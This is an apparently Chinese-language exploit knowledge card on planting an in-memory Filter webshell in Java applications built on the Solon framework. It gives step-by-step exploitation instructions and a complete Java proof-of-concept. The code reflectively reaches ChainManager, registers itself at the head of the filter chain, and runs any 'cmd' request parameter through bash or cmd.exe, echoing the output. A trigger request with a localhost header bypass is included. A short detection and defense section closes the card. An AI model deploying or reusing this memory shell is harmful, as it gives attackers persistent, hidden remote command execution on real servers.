---
id: web-java-framework-solon-filter-memshell-chainmanager-reflect
title: Solon 框架 Filter 内存马：静态块反射 Context.current 链路取 ChainManager 并 addFilter 执行 cmd
type: scenario
domain: web
path: web/java/framework
technique: solon-filter-memshell-chainmanager-reflect
aliases:
- Solon 内存马
- Solon Filter 内存马
- ChainManager.addFilter
- Context.current 反射链
- serverHandler handler arg$1
- Solon cmd 回显
tags:
- java
- solon
- memshell
- filter
- chainmanager
- reflection
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V261
  verified_at: '2026-11-07T17:33:36+08:00'
  notes: '已对照原文与25张图核对：正文20-33行、266-322行给出的TestTemplatesImpl代码（Context.current→request父类字段request→serverHandler→handler→arg→父类_chainManager→ChainManager.addFilter(this,0)，doFilter读cmd用ProcessBuilder执行）与卡内PoC逐行一致；14图Burp GET /?cmd=calc + X-Real-Ip: localhost 得到计算器回显，验证内存马生效。触发前提为已有类加载入口（本题fastjson2反序列化），卡内已写明。dedup recommendation new：候选为Tomcat Filter/Spring MVC Interceptor/WebFlux/Tomcat Listener等不同框架注册点，非同一链。未验证点：PoC未复跑；字段层级依Solon版本可能变化，卡内已注明。'
---

## 一句话结论

在 Solon 应用中，让恶意类实现 `org.noear.solon.core.handle.Filter`，在其静态初始化块里从 `Context.current()` 出发，沿 `request` 包装层、`serverHandler`、`handler`、lambda 捕获的 `arg$1` 逐层反射拿到 `_chainManager`，调用 `ChainManager.addFilter(this, 0)` 把自身注册进过滤器链；`doFilter` 中读取 `cmd` 参数用 `ProcessBuilder` 执行并把输出写回响应，即可获得可复用的 Solon Filter 内存马。

## 原理

- Solon 的 `Context.current()` 返回当前请求线程绑定的上下文；`ctx.request()` 返回的是经过包装的请求对象，真实的 server 请求、serverHandler 与业务 handler 都保存在包装对象的私有字段里。
- 通过反射沿对象图逐层取字段：包装 request 的父类 `request` 字段 → 真实 request；`serverHandler` 字段 → 服务器处理器；`handler` 字段 → Solon 的处理器（通常是 lambda/方法引用生成的类）；`arg$1` → lambda 捕获的 `SolonApp`/核心对象；再取其父类的 `_chainManager` → `ChainManager`。
- `ChainManager` 持有过滤器链；调用 `addFilter(Filter, int index)` 可在运行时把任意 Filter 插入链首（index 0），后续请求会先经过该 Filter。
- 恶意 Filter 的 `doFilter(Context ctx, FilterChain chain)` 里判断 `ctx.param("cmd")`，用 `ProcessBuilder` 执行命令并把输出 `ctx.output(output)` 写回，然后继续 `chain.doFilter(ctx)`。由于 Filter 在链首，任何带 `cmd` 参数的请求都能触发；类加载发生在反序列化/表达式执行阶段，此时请求线程的 `Context.current()` 可用，因此静态块能完成注册。
- 该手法依赖 Solon 内部字段名（`request`/`serverHandler`/`handler`/`arg$1`/`_chainManager`），不同 Solon 版本的包装层级可能变化，需要按目标版本重新确认对象图。

## 触发条件

- 目标为 Solon 框架的 Java Web 应用。
- 攻击者已有任意类加载/代码执行能力（如 Java 原生反序列化 TemplatesImpl、SpEL、表达式注入等），能把该 Filter 类实例化或触发其静态初始化。
- 触发发生在处理 HTTP 请求的线程中，`Context.current()` 非空。
- 目标 classpath 含 `org.noear.solon.core.handle.Filter` 与 `ChainManager`；未对 `java.lang.reflect`/Solon 内部类做反序列化白名单。

## 利用步骤

1. 编写实现 `org.noear.solon.core.handle.Filter` 的恶意类；静态块中执行反射链：
   `Context.current().request()` → 父类字段 `request` → 字段 `serverHandler` → 字段 `handler` → 字段 `arg$1` → 父类字段 `_chainManager`。
2. 将取到的对象强转为 `ChainManager`，调用 `chainManager.addFilter(new EvilFilter(), 0)` 注册。
3. 在 `doFilter` 中实现命令执行：判断 `ctx.param("cmd")`，按操作系统选择 `cmd.exe /c` 或 `/bin/bash -c`，读取进程输出并 `ctx.output(output)`。
4. 把该类的字节码作为 TemplatesImpl `_bytecodes`（或其他可执行类加载载体）投递，触发静态初始化完成注册。
5. 发送 `GET /?cmd=<命令> HTTP/1.1`，必要时带目标要求的本地请求头（如 `X-Real-Ip: localhost`）绕过前置于反序列化之外的访问校验。
6. 观察响应中的命令输出；后续可用同一 Filter 执行任意命令，无需再次反序列化。

## PoC

```java
package org.example.demo.Utils;

import org.noear.solon.annotation.Component;
import org.noear.solon.core.ChainManager;
import org.noear.solon.core.handle.Context;
import org.noear.solon.core.handle.Filter;
import org.noear.solon.core.handle.FilterChain;

import java.lang.reflect.Field;

@Component
public class TestTemplatesImpl implements Filter {
    static {
        try {
            Context ctx = Context.current();
            Object obj = ctx.request();

            Field field = obj.getClass().getSuperclass().getDeclaredField("request");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("serverHandler");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("handler");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("arg$1");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getSuperclass().getDeclaredField("_chainManager");
            field.setAccessible(true);
            obj = field.get(obj);

            ChainManager chainManager = (ChainManager) obj;
            chainManager.addFilter(new TestTemplatesImpl(), 0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void doFilter(Context ctx, FilterChain chain) throws Throwable {
        try {
            if (ctx.param("cmd") != null) {
                String str = ctx.param("cmd");
                try {
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                            ? new String[]{"cmd.exe", "/c", str}
                            : new String[]{"/bin/bash", "-c", str};
                    String output = new java.util.Scanner(
                            new ProcessBuilder(cmds).start().getInputStream())
                            .useDelimiter("\\A").next();
                    ctx.output(output);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Throwable e) {
            System.out.println("异常：" + e.getMessage());
        }
        chain.doFilter(ctx);
    }
}
```

```text
GET /?cmd=calc HTTP/1.1
Host: localhost:8081
Connection: keep-alive
X-Real-Ip: localhost
```

## 变体与关联

- 变体：不实现 Filter 而包装/替换 Solon 的 `Handler`、`Interceptor` 或路由，同样可做到请求级命令执行；核心都是拿到 `ChainManager` 或路由注册表。
- 变体：字段层级随 Solon 版本变化；可先在目标上 `Context.current().request().getClass()` 逐层打印字段，或调试 dump 对象图确认。
- 关联：[[web-java-framework-blade-route-memshell]]（Blade 框架 Route 内存马，同为 Java 框架运行时注册）、[[web-java-framework-spring-webflux-filteringwebhandler-memshell]]（Spring WebFlux WebFilter 内存马）、[[web-java-component-tomcat-dynamic-filter-memshell]]（Tomcat Filter 内存马）、[[web-java-deserialization-fastjson2-serialize-getter-templates-proxy-bypass]]（用 TemplatesImpl 投递本类的反序列化链）。
- 边界：需要先有代码执行/类加载入口；字段名变化会导致反射失败；内存马只在当前进程生命周期内有效，重启即失效。

## 检测与防御

- 检测：检查 Solon 应用的 Filter 链中是否出现来源不明/运行时新增的 Filter；关注包含 `Context.current`、`ChainManager.addFilter`、`ProcessBuilder` 的类；JVM 层可用内存马扫描工具枚举 Filter/Handler。
- 防御：反序列化白名单禁止 `java.lang.reflect.Proxy`、`TemplatesImpl` 等载体；限制 Solon 内部字段反射（升级版本/模块封装）；对运行时注册 Filter/Handler 的操作做审计。
- 加固：不要对不可信数据做 Java 原生反序列化；关键接口做认证与输入校验；使用 RASP/内存马检测，定期重启与完整性校验只能缩短驻留时间。
